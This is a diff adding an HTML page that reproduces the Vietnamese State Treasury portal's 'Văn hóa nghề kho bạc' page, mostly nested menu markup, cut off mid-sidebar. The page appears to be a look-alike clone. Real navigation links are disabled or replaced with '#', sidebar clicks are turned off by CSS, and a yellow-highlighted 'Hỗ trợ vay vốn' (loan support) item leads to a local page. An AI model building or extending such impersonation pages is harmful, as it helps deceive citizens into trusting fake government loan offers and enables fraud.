@@ -1,0 +1,1676 @@
+<html class="p_AFMaximized" dir="ltr" lang="vi">
+
+<head>
+  <link rel="stylesheet" charset="UTF-8" type="text/css" href="css/theme.css">
+  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+  <script type="text/javascript" async=""
+    src="https://www.googletagmanager.com/gtag/js?id=G-R35BJDJ7F2&amp;cx=c&amp;gtm=4e6160"></script>
+  <script type="text/javascript" async="" defer="" src="https://f-emc.ngsp.gov.vn/embed/gov-tracking.min.js"></script>
+  <script type="text/javascript" src="/webcenter/adf/jsLibs/Locale1_2_12_3_3.js"></script>
+  <script type="text/javascript">var AdfAssert = new Object(); AdfAssert.DEBUG = false;</script>
+  <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/boot-11.1.1.9.0-5072.js"></script>
+  <script
+    type="text/javascript">AdfLogger.DEFAULT_LEVEL = AdfLogger.OFF; (AdfLogger.LOGGER = new AdfLogger('global', new AdfBufferedLogWriter())).register(); var checkAgentSupport = false; AdfAgent.AGENT = AdfAgent.getAgent(window); var lookAndFeel = new AdfDhtmlLookAndFeel(window); AdfAgent._LOG_WRITERS = "NativeLogWriter"; AdfPage.PAGE = lookAndFeel.createPage(); var page = AdfPage.PAGE; page.setBaseResourceUrl("/webcenter"); page.__setAutomationEnabled(false); page.setAnimationEnabled(true); page.__setSessionIdentifier('1a4ap1j7e9'); page.__setOutputMode('default');</script>
+  <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/core-11.1.1.9.0-5072.js"></script>
+  <script type="text/javascript"
+    src="/webcenter/afr/AdfTranslations-11.1.1.9.0-5072vi.js?loc=vi&amp;skinId=gsr92b5dff6_711b_421d_a483_02528dd8b233.desktop"></script>
+  <meta name="keywords">
+  <title>Văn hóa nghề kho bạc</title>
+  <script type="text/javascript" language="javascript"
+    src="/webcenter/oracle/webcenter/siteresources/scopedMD/shared/js/jquery-1.8.2.js"></script>
+  <script type="text/javascript" language="javascript"
+    src="/webcenter/oracle/webcenter/siteresources/scopedMD/shared/js/ad-gallery/ad-gallery.js"></script>
+  <script type="text/javascript" language="javascript"
+    src="https://www.googletagmanager.com/gtag/js?id=UA-76455638-2"></script>
+  <link rel="stylesheet" type="text/css" afrres="true" href="css/placeholder.css">
+  <script type="text/javascript" language="javascript">$(document).ready(function () {
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'UA-76455638-2');
+
+      startTime();
+      $('.backToTop').click(function () {
+        jQuery('html, body').animate({ scrollTop: 0 }, 500);
+      });
+      $(window).scroll(function () {
+        if ($(this).scrollTop() > 100) {
+          $('.backToTop').fadeIn(500);
+        } else {
+          $('.backToTop').fadeOut(500);
+        }
+      });
+    });
+    function startTime() {
+      var today = new Date();
+      var h = today.getHours();
+      var m = today.getMinutes();
+      var s = today.getSeconds();
+      m = checkTime(m);
+      s = checkTime(s);
+      months = ['01', '02', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12'],
+        days = ['Chủ nhật', 'Thứ Hai', 'Thứ Ba', 'Thứ Tư', 'Thứ Năm', 'Thứ Sáu', 'Thứ Bảy'];
+      var qqqq = '<b>' + days[today.getDay()] + ', ' + today.getDate() + '/' + months[today.getMonth()] + '/' + today.getFullYear() + '</b>';
+      document.getElementById('intros_ex').innerHTML = qqqq + '<b>' + ' ' + h + ":" + m + ":" + s + '</b>';
+      var t = setTimeout(function () { startTime() }, 500);
+    }
+
+    function checkTime(i) {
+      if (10 > i) { i = "0" + i };
+      return i;
+    }
+    function notmatch(str) {
+      var mikExp = /[$\\@\\#%\^\&\*\(\)\[\]\+\_\{\}\`\~\=\|]/;
+      var check = 0;
+      do {
+        check = str.search(mikExp);
+        str = str.substring(0, check) + str.substring(check + 1, str.length);
+      }
+      while (check != -1);
+      return str;
+
+    }
+
+    function redirectURLKey(event) {
+
+      if (event.getKeyCode() == 13) {
+        var searchText = event.getSource().findComponent("inputsearch");
+
+        var rootURL = $(".contexRoot").text();
+        var text = searchText.getValue() == null ? "" : searchText.getValue();
+        text = encodeURIComponent(text);
+        var url = "/webcenter/portal/" + rootURL + "/r/search?SearchInput=" + text;
+        window.location.href = url;
+        return false;
+      } else {
+        var searchText = document.getElementById("T:inputsearch::content").value;
+        var truetext = notmatch(searchText);
+        document.getElementById("T:inputsearch::content").value = truetext;
+      }
+
+
+
+    }
+    function redirectURL(event) {
+
+      var searchText = event.getSource().findComponent("inputsearch");
+      var rootURL = $(".contexRoot").text();
+      var text = searchText.getValue() == null ? "" : searchText.getValue();
+      text = encodeURIComponent(text);
+      var url = "/webcenter/portal/" + rootURL + "/r/search?SearchInput=" + text;
+      window.location.href = url;
+      return false;
+
+
+    }
+  </script>
+  <style>
+    /* Fix sidebar menu styling */
+    .leftmenu-content .x2by,
+    .leftmenu-content .x2bz {
+      background: linear-gradient(to bottom, #e8f4fc 0%, #c5dff0 100%);
+      border-bottom: 1px solid #a6c9e2;
+      padding: 5px 10px;
+      margin: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start !important;
+      text-align: left !important;
+    }
+
+    .leftmenu-content .x2bz {
+      background: linear-gradient(to bottom, #4a90c2 0%, #2d6b9a 100%);
+    }
+
+    .leftmenu-content .x2bz a {
+      color: #fff !important;
+    }
+
+    .leftmenu-content .xeb {
+      color: #1a4f7a;
+      text-decoration: none;
+      font-size: 13px;
+      display: block;
+      text-align: left !important;
+    }
+
+    .leftmenu-content .x2by::before,
+    .leftmenu-content .x2bz::before {
+      content: "";
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      background: url('images/arrow_dots.png') no-repeat center center;
+      background-size: contain;
+      margin-right: 8px;
+      vertical-align: middle;
+      flex-shrink: 0;
+      filter: brightness(0.6) contrast(1.5);
+    }
+
+    .leftmenu-content .x2bz::before {
+      filter: brightness(2) contrast(2);
+    }
+
+    .leftmenu-content .RootNode {
+      margin: 0;
+      padding: 0;
+    }
+
+    .leftmenu-content .NodeLevel2 ul {
+      margin: 0;
+      padding: 0;
+    }
+
+    .leftmenu-content li {
+      list-style: none;
+    }
+
+    /* Disable clicks on sidebar menu - hover only */
+    .leftmenu-content .xeb {
+      pointer-events: none;
+      cursor: default;
+    }
+
+    .leftmenu-content .x2by,
+    .leftmenu-content .x2bz {
+      cursor: default;
+    }
+  </style>
+</head>
+
+<body class="x15y p_AFMaximized"><noscript>This page uses JavaScript and requires a JavaScript enabled browser.Your
+    browser is not JavaScript enabled.</noscript><iframe name="afr::PushIframe" id="afr::PushIframe"
+    style="display:none" src="/webcenter/afr/blank.html"></iframe><input type="hidden"
+    id="oracle.adf.view.faces.RICH_UPDATE">
+  <div id="afr::DocWrapper">
+    <div id="docrt"><a id="docrt::skip" href="#" class="x1bc" style="display: none;">Skip to content</a>
+      <form id="f1" name="f1" class="x15t" enctype="multipart/form-data" method="POST"
+        action="/webcenter/faces/oracle/webcenter/page/scopedMD/s433922df_f7e3_43d7_afe8_0e945a3e1d57/Page284.jspx?wc.contextURL=/spaces/kbnn&amp;_adf.ctrl-state=jufll5r8s_1349">
+        <span class="contexRoot" style="display:none;">kbnn</span>
+        <div id="T:pt_root" class="x1a"
+          style="position:relative!important;width:1002px;margin:0 auto;height:auto; background-image: url('images/bg_banner.jpg') !important; background-repeat: no-repeat !important; background-position: right top !important;">
+          <div><span id="T:j_id__ctru5pc8" class="x29j x1a"><span id="T:pt_pgl2" class="x29n x1a"
+                style="background-image: url('images/bg_banner.jpg') !important; background-repeat: no-repeat !important; background-position: right top !important;"><a
+                  id="T:pt_i1" class="x29t x19p" href="#" data-original="/webcenter/portal/kbnn/r/m/trangchu"><img
+                    id="T:pt_i1::icon" src="images/logo.png" class="x19w"></a>
+                <div id="T:tit_logo" class="x29u x1a">
+                  <div>
+                    <h3>BỘ TÀI CHÍNH</h3>
+                    <h1>Kho bạc nhà nước</h1>
+                  </div>
+                </div>
+                <div class="header-right"><a href="mailto:congttdtkbnn@vst.gov.vn"><img id="T:j_id__ctru9pc8"
+                      class="xeg" src="images/email.png"></a><a href="#"
+                    data-original="/webcenter/portal/kbnn/r/f/rss"><img id="T:j_id__ctru10pc8" class="xeg"
+                      src="images/rss.png"></a><a href="https://facebook.com/"><img id="T:j_id__ctru11pc8" class="xeg"
+                      src="images/face.png"></a><a href="https://twitter.com/"><img id="T:j_id__ctru12pc8" class="xeg"
+                      src="images/tiwter.png"></a><a id="T:pt_gl1" class="xeb p_AFDisabled"></a></div>
+                <div class="banner-date">
+                  <ul class="intros_ex">
+                    <li id="intros_ex"><b>Thứ Năm, 8/01/2026</b><b> 15:42:08</b></li>
+                  </ul>
+                </div>
+                <div id="T:pt_pbl1" class="x29x">
+                  <div></div>
+                  <div></div>
+                  <ul id="menu">
+                    <li><a id="T:pt_gl2" class="xeb" href="index.html"
+                        data-original="/webcenter/portal/kbnn/r/m/trangchu87">Trang chủ</a></li>
+                    <li><a id="T:pt_gl2j_id_1" class="xeb" href="#"
+                        data-original="/webcenter/portal/kbnn/r/m/gtkbnn">Giới thiệu KBNN</a>
+                    </li>
+                    <li><a id="T:pt_gl2j_id_2" class="xeb" href="#"
+                        data-original="/webcenter/portal/kbnn/r/m/clptkbnnn">Chiến lược phát
+                        triển KBNN</a></li>
+                    <li><a id="T:pt_gl2j_id_3" class="xeb" href="vay-von.html" style="color: #ffcc00 !important;">Hỗ trợ
+                        vay vốn</a></li>
+                  </ul><span id="T:search" class="x29w x1a">
+                    <table class="x1kb x1u"
+                      style="height:28px; width:200px; background:#246097 none repeat scroll 0% 0%; text-align:right; float:left; font-size:medium;"
+                      id="T:inputsearch" cellpadding="0" cellspacing="0" border="0" summary="">
+                      <tbody>
+                        <tr>
+                          <td class="xu"></td>
+                          <td valign="top" nowrap="" class="xwv"><input id="T:inputsearch::content" name="T:inputsearch"
+                              style="text-align:right!important;height: 26px;color:#fff ; width: 200px; background: #246097;border: none;text-align: right;color: #fff;float: left;font-size: 14px;"
+                              class="x25" placeholder="Tìm kiếm" type="text"></td>
+                        </tr>
+                      </tbody>
+                    </table><a id="T:pt_cb1" class="x2b3 xf3" onclick="return false;" href="#"><img id="T:pt_cb1::icon"
+                        src="images/search_bt.png" class="x19t"></a>
+                  </span>
+                  <div></div>
+                  <div></div>
+                </div>
+              </span>
+              <div id="T:j_id__ctru22pc8" class="x29s x1a">
+                <div>
+                  <div id="T:pcl1" class="xhk">
+                    <div id="T:pcl1::c">
+                      <div id="T:pgl1" class="xdk x1a" style="width:100%;height:100%;overflow:auto;">
+                        <div>
+                          <div id="T:pgl2" class="xhg x1a">
+                            <div>
+                              <table id="T:tl1" cellpadding="0" cellspacing="0" border="0" width="100%" summary="">
+                                <tbody>
+                                  <tr id="T:rl1">
+                                    <td id="T:cf2" valign="top" width="100%">
+                                      <div id="T:hm_pnc2" class="xh5"
+                                        style="overflow:auto;margin-top:10px;padding:0px;">
+                                        <div id="T:hm_pnc2::content">
+                                          <div>
+                                            <table cellpadding="0" cellspacing="0" border="0" summary=""
+                                              id="T:pgl1464361243" class="xiw xhg x1a">
+                                              <tbody>
+                                                <tr>
+                                                  <td valign="top">
+                                                    <div id="T:pc7435243254" class="xh5"
+                                                      style="margin-right:5px;margin-left:10px;padding:0px;width:275px;">
+                                                      <div id="T:pc7435243254::content">
+                                                        <div>
+                                                          <div id="T:sdf_for_oc_2609714310region1" class="xdv">
+                                                            <div class="xfr p_AFMedium">
+                                                              <div id="T:sdf_for_oc_2609714310region1::div2"
+                                                                style="background-color:transparent;"
+                                                                class="xft p_AFMedium">
+                                                                <div id="T:oc_2609714310region1" class="xe0"><span
+                                                                    id="T:oc_2609714310region1:pgl1" class="x1a">
+                                                                    <div id="T:oc_2609714310region1:pc1" class="xh5">
+                                                                      <div id="T:oc_2609714310region1:pc1::content">
+                                                                        <div>
+                                                                          <div
+                                                                            id="T:oc_2609714310region1:sdf_for_oc_2793595851region1"
+                                                                            class="xdv">
+                                                                            <div class="xfr p_AFMedium">
+                                                                              <div
+                                                                                id="T:oc_2609714310region1:sdf_for_oc_2793595851region1::div2"
+                                                                                style="background-color:transparent;"
+                                                                                class="xft p_AFMedium">
+                                                                                <div
+                                                                                  id="T:oc_2609714310region1:oc_2793595851region1"
+                                                                                  class="xe0">
+                                                                                  <div
+                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:pbl1">
+                                                                                    <div></div>
+                                                                                    <div></div>
+                                                                                    <div class="leftmenu-content"
+                                                                                      style="overflow:hidden;">
+                                                                                      <ul class="RootNode"
+                                                                                        style="list-style-type:none">
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:0:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:1:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/lm/dhdb">Đại
+                                                                                                          Hội Đảng
+                                                                                                          Bộ</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:1:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:1:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:1:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/lm/vhnkb3">Hỏi
+                                                                                                          đáp - Kiến
+                                                                                                          nghị</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:1:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:2:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:2:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:2:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/lm/vhnkb">Văn
+                                                                                                          hóa nghề kho
+                                                                                                          bạc</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:2:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:3:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:3:pgl3"
+                                                                                                      class="x2bz x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:3:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/lm/vhnkb34">Tiếp
+                                                                                                          công dân và
+                                                                                                          cập nhật nội
+                                                                                                          dung </a>
+                                                                                                      </div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:3:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                          <li></li>
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:4:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:4:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:4:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/lm/htvb">Hệ
+                                                                                                          thống văn
+                                                                                                          bản</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:4:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:2:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:0:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:0:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:0:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/ttsk">Tin
+                                                                                                          tức sự
+                                                                                                          kiện</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:0:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:1:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:1:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:1:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/tb">Thông
+                                                                                                          báo</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:1:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:2:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:2:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:2:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/baocaothuongnienhtkbnn">Báo
+                                                                                                          cáo thường
+                                                                                                          niên hệ thống
+                                                                                                          KBNN</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:2:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:3:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:3:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:3:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/media">Tin
+                                                                                                          media</a>
+                                                                                                      </div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:3:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:4:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:4:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:4:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/tpcp">Trái
+                                                                                                          phiếu Chính
+                                                                                                          phủ </a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:4:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:5:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:5:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:5:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/kbnncdmhtcbmm">KBNN
+                                                                                                          chuyển đổi mô
+                                                                                                          hình tổ chức
+                                                                                                          bộ máy mới</a>
+                                                                                                      </div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:5:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:6:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:6:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:6:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/tght">Tỷ
+                                                                                                          giá hạch
+                                                                                                          toán</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:6:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                                <li><span
+                                                                                                    id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:7:pgl2"
+                                                                                                    class="x1a">
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:7:pgl3"
+                                                                                                      class="x2by x1a">
+                                                                                                      <div><a
+                                                                                                          id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:7:gl1"
+                                                                                                          class="xeb"
+                                                                                                          href="#"
+                                                                                                          data-original="/webcenter/portal/kbnn/r/o/ttdt">Thông
+                                                                                                          tin đấu
+                                                                                                          thầu</a></div>
+                                                                                                    </div>
+                                                                                                    <div
+                                                                                                      id="T:oc_2609714310region1:oc_2793595851region1:i3:2:i1:7:pbl18"
+                                                                                                      class="level2">
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                      <div
+                                                                                                        class="NodeLevel3">
+                                                                                                        <ul
+                                                                                                          style="list-style-type:none">
+                                                                                                        </ul>
+                                                                                                      </div>
+                                                                                                      <div></div>
+                                                                                                      <div></div>
+                                                                                                    </div>
+                                                                                                  </span></li>
+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:3:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:4:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
+                                                                                              </ul>
+                                                                                            </div>
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                          </div>
+                                                                                        </li>
+                                                                                        <li>
+                                                                                          <div
+                                                                                            id="T:oc_2609714310region1:oc_2793595851region1:i3:5:pbl8">
+                                                                                            <div></div>
+                                                                                            <div></div>
+                                                                                            <div class="NodeLevel2">
+                                                                                              <ul
+                                                                                                style="list-style-type:none">
